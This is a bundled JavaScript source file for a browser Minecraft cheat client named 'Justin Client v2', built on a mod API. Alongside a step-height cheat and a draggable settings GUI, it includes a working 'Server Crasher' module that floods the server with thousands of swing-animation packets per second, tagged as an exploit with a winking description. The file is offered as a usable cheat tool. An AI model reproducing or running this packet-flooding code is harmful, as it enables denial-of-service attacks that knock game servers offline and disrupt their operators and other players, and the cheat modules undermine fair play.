var __defProp = Object.defineProperty;
var __export = (target, all) => {
  for (var name in all)
    __defProp(target, name, {
      get: all[name],
      enumerable: true,
      configurable: true,
      set: (newValue) => all[name] = () => newValue
    });
};

// src/util/clientName.ts
function hexToRgb(hexColor) {
  var match = /^#?([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i.exec(hexColor);
  return match ? { r: parseInt(match[1], 16), g: parseInt(match[2], 16), b: parseInt(match[3], 16) } : { r: 255, g: 255, b: 255 };
}
var clientName = "Justin Client v2";
var color = "#00c3ff";
var rgbColor = hexToRgb(color);
var normalizedRgb = {
  r: Math.round((rgbColor.r / 255 + Number.EPSILON) * 100) / 100,
  g: Math.round((rgbColor.g / 255 + Number.EPSILON) * 100) / 100,
  b: Math.round((rgbColor.b / 255 + Number.EPSILON) * 100) / 100
};

// src/cheats/step.ts
var exports_step = {};
__export(exports_step, {
  init: () => init
});
function init(parent) {
  parent.settings = [
    {
      name: "Height",
      type: "Slider",
      min: 1,
      max: 6,
      step: 0.5,
      current: 1.5
    }
  ];
  parent.onUpdate = function() {
    if (parent.getEnabled()) {
      if (ModAPI.player.stepHeight != parent.settings[0].current) {
        ModAPI.player.stepHeight = parent.settings[0].current;
      }
    }
  };
  parent.onEnable = function() {
    if (ModAPI.player != null) {
      ModAPI.player.stepHeight = parent.settings[0].current;
    }
  };
  parent.onDisable = function() {
    if (ModAPI.player != null) {
      ModAPI.player.stepHeight = 0.6000000238418579;
    }
  };
}

// src/cheats/servercrasher.ts
var exports_servercrasher = {};
__export(exports_servercrasher, {
  init: () => init2
});
function init2(parent) {
  parent.crshInter = null;
  parent.settings = [
    {
      name: "PPS",
      type: "Slider",
      min: 20,
      max: 20000,
      step: 10,
      current: 5000
    }
  ];
  function crash() {
    if (ModAPI.player != null) {
      for (let i = 0;i < parent.settings[0].current; i++) {
        ModAPI.network.addToSendQueue(ModAPI.reflect.getClassById("net.minecraft.network.play.client.C0APacketAnimation").constructors[0]());
      }
    } else {
      parent.disable();
    }
  }
  parent.onEnable = function() {
    parent.crshInter = setInterval(crash, 1000);
  };
  parent.onDisable = function() {
    if (parent.crshInter != null) {
      clearInterval(parent.crshInter);
    }
  };
}

// src/util/actualModules.ts
function template(mod) {
  this.enabledDONOTUSE = false;
  this.init = function() {
  };
  this.onEnable = function() {
  };
  this.onDisable = function() {
  };
  this.enable = function() {
    this.enabledDONOTUSE = true;
    this.onEnable();
    refreshModules("enable");
  };
  this.disable = function() {
    this.enabledDONOTUSE = false;
    this.onDisable();
    refreshModules("disable");
  };
  this.onKey = function(e) {
  };
  this.onMCKey = function(e) {
  };
  this.getEnabled = function() {
    return this.enabledDONOTUSE;
  };
  this.toggle = function() {
    this.enabledDONOTUSE = !this.enabledDONOTUSE;
    if (this.enabledDONOTUSE) {
      this.onEnable();
    } else {
      this.onDisable();
    }
  };
  this.onUpdate = function() {
  };
  this.onFrame = () => {
  };
  this.toggleKey = "KeyNone";
  this.alert = function() {
    alert();
  };
  this.settings = [];
  mod.init(this);
}
var categories = {
  movement: "Movement",
  player: "Player",
  render: "Render",
  fun: "Fun"
};
var modules = {
  step: {
    name: "Step",
    function: new template(exports_step),
    category: "Movement",
    description: "Allows you to step higher"
  },
  servercrasher: {
    name: "Server Crasher",
    function: new template(exports_servercrasher),
    category: "Exploit",
    description: "Sends just a few swing packets ;)"
  }
};

// src/gui.ts
function isOpen() {
  if (document.getElementById("ui") == null) {
    return false;
  } else {
    return true;
  }
}
function setting(module) {
  const lst = module.function.settings;
  console.log(lst);
  const s = document.createElement("div");
  s.className = "setting";
  s.style.position = "absolute";
  s.style.color = "white";
  s.style.backdropFilter = "blur(8px)";
  s.style.background = "rgba(0,0,0,0.5)";
  s.style.borderRadius = "15px";
  s.style.padding = "15px";
  s.style.fontFamily = "monospace";
  s.style.overflowX = "hidden";
  s.style.overflowX = "auto";
  s.style.width = "15%";
  s.style.height = "50%";
  s.style.top = "100px";
  s.style.left = "100px";
  s.style.userSelect = "none";
  s.style.zIndex = "1000";
  s.style.backdropFilter = "blur(8px)";
  s.style.resize = "both";
  const title = document.createElement("div");
  title.innerText = module.name;
  title.style.fontSize = "22px";
  s.appendChild(title);
  const close = document.createElement("div");
  close.innerText = "X";
  close.style.fontSize = "28px";
  close.style.position = "absolute";
  close.style.right = "15px";
  close.style.top = "10px";
  close.style.cursor = "pointer";
  s.appendChild(close);
  const s2 = s;
  function E({ movementX, movementY }) {
    let h = window.getComputedStyle(s2);
    let g = parseInt(h.left);
    let _ = parseInt(h.top);
    s2.style.left = `${g + movementX}px`;
    s2.style.top = `${_ + movementY}px`;
  }
  title.addEventListener("mousedown", () => {
    window.addEventListener("mousemove", E);
  });
  window.addEventListener("mouseup", () => {
    window.removeEventListener("mousemove", E);
  });
  document.body.appendChild(s);
  const button = document.createElement("button");
  button.innerText = "Toggle";
  button.style.border = "none";
  button.style.color = "#FFF";
  button.style.background = "rgba(100,100,100,0.5)";
  button.style.width = "100%";
  button.style.margin = "5px";
  button.style.borderRadius = "10px";
  button.style.fontSize = "18px";
  button.style.padding = "10px 5px 10px 5px";
  button.onclick = () => {
    module.function.toggle();
    refreshModules("toggle");
  };
  s.appendChild(button);
  const keybindbutton = document.createElement("button");
  if (module.function.toggleKey != null) {
    keybindbutton.innerText = module.function.toggleKey;
  } else {
    keybindbutton.innerText = "No key set";
  }
  keybindbutton.style.border = "none";
  keybindbutton.style.color = "#FFF";
  keybindbutton.style.background = "rgba(100,100,100,0.5)";
  keybindbutton.style.width = "100%";
  keybindbutton.style.margin = "5px";
  keybindbutton.style.borderRadius = "10px";
  keybindbutton.style.fontSize = "18px";
  keybindbutton.style.padding = "10px 0px 10px 0px";
  keybindbutton.onclick = () => {
    keybindbutton.innerText = "Press any key or esc...";
    window.addEventListener("keydown", close2);
    function close2(I) {
      if (I.code == "Escape") {
        module.function.toggleKey = "KeyNone";
      } else {
        module.function.toggleKey = I.code;
      }
      keybindbutton.innerText = module.function.toggleKey;
      window.removeEventListener("keydown", close2);
    }
  };
  s.appendChild(keybindbutton);
  for (let r in lst) {
    if (lst.hasOwnProperty(r)) {
      const lstr = lst[r];
      const bg = document.createElement("div");
      bg.style.background = "rgba(100,100,100,0.5)";
      bg.style.margin = "5px";
      bg.style.padding = "5px";
      bg.style.borderRadius = "10px";
      s.appendChild(bg);
      if (lstr.type == "List") {
        const selDesc = document.createElement("div");
        selDesc.style.fontSize = "20px";
        selDesc.innerText = `${lstr.name} - ${lstr.current}`;
        bg.appendChild(selDesc);
        const sel = document.createElement("select");
        sel.onchange = () => {
          lstr.current = parseInt(sel.value);
          selDesc.innerText = `${lstr.name} - ${lstr.current}`;
        };
        for (let j in lstr.modes) {
          if (lstr.modes.hasOwnProperty(j)) {
            const opt = document.createElement("option");
            opt.innerText = lstr.modes[j];
            opt.value = `${j}`;
          }
          bg.appendChild(sel);
        }
      } else if (lstr.type == "Slider") {
        const slideDesc = document.createElement("div");
        slideDesc.style.fontSize = "20px";
        slideDesc.innerText = `${lstr.name} - ${lstr.current}`;
        bg.appendChild(slideDesc);
        const slide = document.createElement("input");
        slide.type = "range";
        slide.style.width = "100%";
        slide.step = lstr.step;
        slide.min = lstr.min;
        slide.max = lstr.max;
        slide.value = lstr.current;
        slide.onchange = () => {
          lstr.current = parseFloat(slide.value);
          slideDesc.innerText = `${lstr.name} - ${lstr.current}`;
        };
        bg.appendChild(slide);
      } else if (lstr.type == "Boolean") {
        const boolDesc = document.createElement("div");
        boolDesc.style.fontSize = "20px";
        boolDesc.innerText = `${lstr.name} - ${lstr.toggled}`;
        bg.appendChild(boolDesc);
        const bool = document.createElement("input");
        bool.type = "checkbox";
        bool.checked = lstr.toggled;
        bool.onchange = () => {
          lstr.toggled = bool.checked;
          boolDesc.innerText = `${lstr.name} - ${lstr.toggled}`;
        };
        bg.appendChild(bool);
      } else if (lstr.type == "Color") {
        const colorDesc = document.createElement("div");
        colorDesc.style.fontSize = "20px";
        colorDesc.innerText = `${lstr.name} - ${lstr.current}`;
        bg.appendChild(colorDesc);
        const color2 = document.createElement("input");
        color2.type = "color";
        color2.value = lstr.current;
        color2.onchange = () => {
          lstr.current = color2.value;
          colorDesc.innerText = `${lstr.name} - ${lstr.current}`;
        };
        bg.appendChild(color2);
      }
    }
  }
}
function open() {
  ModAPI.hooks.methods.nmcg_GuiIngameMenu_drawScreen = () => {
  };
  document.exitPointerLock();
  const cn = clientName;
  const ui = document.createElement("div");
  ui.style.animation = "fade-in 0.5s";
  ui.id = "ui";
  ui.style.position = "fixed";
  ui.style.width = "66%";
  ui.style.height = "66%";
  ui.style.top = `${document.body.clientHeight * 0.165}px`;
  ui.style.left = `${document.body.clientWidth * 0.165}px`;
  ui.style.color = "white";
  ui.style.backdropFilter = "blur(8px)";
  ui.style.background = "rgba(0,0,0,0.75)";
  ui.style.borderRadius = "15px";
  ui.style.padding = "15px";
  ui.style.fontFamily = "monospace";
  ui.style.overflowY = "hidden";
  ui.style.userSelect = "none";
  ui.style.zIndex = "1000";
  document.body.appendChild(ui);
  const title = document.createElement("div");
  title.innerText = cn;
  title.style.fontSize = "24px";
  title.style.margin = "5px";
  ui.appendChild(title);
  const search = document.createElement("input");
  search.style.width = "33%";
  search.type = "text";
  search.style.border = "solid 2px rgba(200,200,200,0.5)";
  search.style.borderRadius = "10px";
  search.style.color = "rgba(255,255,255,1)";
  search.style.display = "inline-block";
  search.style.padding = "8px";
  search.style.marginLeft = "20px";
  search.style.fontSize = "22px";
  search.style.background = "rgba(50,50,50,.24)";
  search.placeholder = "\uD83D\uDD0E\uFE0E Search";
  search.style.backdropFilter = "blur(8px)";
  const close = document.createElement("div");
  close.innerText = "X";
  close.style.fontSize = "28px";
  close.style.position = "absolute";
  close.style.right = "15px";
  close.style.top = "10px";
  close.style.cursor = "pointer";
  ui.appendChild(close);
  const bar = document.createElement("div");
  bar.style.overflowX = "scroll";
  ui.appendChild(bar);
  for (let i in categories) {
    if (categories.hasOwnProperty(i)) {
      const category = document.createElement("div");
      category.innerText = categories[i];
      category.style.fontSize = "18px";
      category.style.cursor = "pointer";
      category.style.display = "inline-block";
      category.style.padding = "10px";
      category.style.margin = "5px";
      category.style.background = "rgba(100,100,100,0.5)";
      category.style.borderRadius = "5px";
      category.onclick = () => {
      };
    }
  }
  container = document.createElement("center");
  container.style.height = "90%";
  container.style.overflowY = "scroll";
  ui.appendChild(container);
  refreshModules("ui");
}
function refreshModules(logmessage) {
  console.log(logmessage);
  if (isOpen()) {
    container.innerHTML = "";
    for (let d in modules) {
      if (modules.hasOwnProperty(d)) {
        const o = document.createElement("div");
        o.addEventListener("click", (P) => {
          console.log(modules[d]);
          modules[d].function.toggle();
          refreshModules("modl");
        });
        const A = document.createElement("div");
        A.innerText = `${modules[d].name}`;
        A.style.fontSize = "22px";
        A.style.fontWeight = "bold";
        o.appendChild(A);
        o.appendChild(document.createElement("hr"));
        const c = document.createElement("div");
        c.innerText = `${modules[d].description}`;
        o.appendChild(c);
        o.style.textAlign = "left";
        o.style.display = "inline-block";
        o.style.overflowX = "hidden";
        o.style.width = "25%";
        o.style.height = "25%";
        o.style.padding = "5px";
        o.style.borderRadius = "15px";
        o.style.margin = "10px";
        o.style.cursor = "pointer";
        o.style.overflowY = "scroll";
        o.style.background = "rgba(100,100,100,0.5)";
        if (modules[d].function.getEnabled()) {
          o.style.boxShadow = `0px 0px 15px ${color}`;
        }
        o.oncontextmenu = (P) => {
          P.preventDefault();
          new setting(modules[d]);
          console.log(modules[d]);
        };
        container.appendChild(o);
      }
    }
  }
}
function changeMainMenu() {
  const firstButton = ModAPI.mc.currentScreen.buttonList.array1[0];
  const secondButton = ModAPI.mc.currentScreen.buttonList.array1[1];
  const thirdButton = ModAPI.mc.currentScreen.buttonList.array1[2];
  const fourthButton = ModAPI.mc.currentScreen.buttonList.array1[3];
  firstButton.width17 = thirdButton.width17;
  secondButton.width17 = fourthButton.width17;
  firstButton.yPosition = thirdButton.yPosition - 25;
  secondButton.yPosition = fourthButton.yPosition - 25;
  secondButton.xPosition0 = fourthButton.xPosition0;
  ModAPI.mc.currentScreen.enableBlur = 0;
  ModAPI.mc.currentScreen.panoramaTimer -= 1;
  ModAPI.mc.currentScreen.splashText = ModAPI.util.string(clientName);
}
function keyboardEvent(event) {
  if (event.code == "ShiftRight") {
    if (!isOpen()) {
      open();
    }
  }
  if (ModAPI.mc.currentScreen == null && ModAPI.mc.ingameGUI != null) {
    for (let d in modules) {
      if (event.code == modules[d].function.toggleKey) {
        modules[d].function.toggle();
      }
    }
  }
}
var container;
var MainMenuDrawfunc = ModAPI.hooks.methods.nmcg_GuiIngameMenu_drawScreen;

// src/Main.ts
ModAPI.meta.title("Justin v2");
ModAPI.meta.credits("Murturtle");
ModAPI.meta.description("Press right shift ;)");
ModAPI.require("player");
ModAPI.require("network");
ModAPI.require("settings");
ModAPI.require("world");
var MainMenuDrawfunc2 = ModAPI.hooks.methods.nmcg_GuiMainMenu_drawScreen;
ModAPI.hooks.methods.nmcg_GuiMainMenu_drawScreen = function(...n) {
  changeMainMenu();
  return MainMenuDrawfunc2.apply(this, n);
};
document.addEventListener("keydown", keyboardEvent);
ModAPI.addEventListener("update", () => {
  for (let i in modules) {
    if (modules.hasOwnProperty(i)) {
      modules[i].function.onUpdate();
    }
  }
});
document.body.appendChild(document.createElement("style"));
var styleSheet = document.styleSheets[0];
styleSheet.insertRule(`
  @keyframes fade-in {
    from { opacity: 0; }
    to { opacity: 1; }
  }
`);
styleSheet.insertRule(`
  ::-webkit-scrollbar {
    width: 10px;
  }
`);
styleSheet.insertRule(`
  ::-webkit-scrollbar-track {
    background: rgba(0, 0, 0, 0);
  }
`);
styleSheet.insertRule(`
  ::-webkit-scrollbar-thumb {
    background: rgba(100, 100, 100, 0.5);
    filter: blur(4px);
  }
`);
styleSheet.insertRule(`
  ::-webkit-resizer {
    background: rgba(0, 0, 0, 0);
    opacity: 0;
    display: none;
  }
`);
styleSheet.insertRule(`
  ::-webkit-scrollbar-corner {
    background: rgba(0, 0, 0, 0);
    opacity: 0;
    display: none;
  }
`);
styleSheet.insertRule(`
  @keyframes rgb-glow {
    0% { box-shadow: 0px 0px 40px rgba(255, 0, 0, 0.75); }
    16% { box-shadow: 0px 0px 40px rgba(255, 255, 0, 0.75); }
    33% { box-shadow: 0px 0px 40px rgba(0, 255, 0, 0.75); }
    50% { box-shadow: 0px 0px 40px rgba(0, 255, 255, 0.75); }
    66% { box-shadow: 0px 0px 40px rgba(0, 0, 255, 0.75); }
    83% { box-shadow: 0px 0px 40px rgba(255, 0, 255, 0.75); }
    100% { box-shadow: 0px 0px 40px rgba(255, 0, 0, 0.75); }
  }
`);
styleSheet.insertRule(`
  @keyframes rgb-text {
    0% { color: rgba(255, 0, 0, 0.75); }
    16% { color: rgba(255, 255, 0, 0.75); }
    33% { color: rgba(0, 255, 0, 0.75); }
    50% { color: rgba(0, 255, 255, 0.75); }
    66% { color: rgba(0, 0, 255, 0.75); }
    83% { color: rgba(255, 0, 255, 0.75); }
    100% { color: rgba(255, 0, 0, 0.75); }
  }
`);
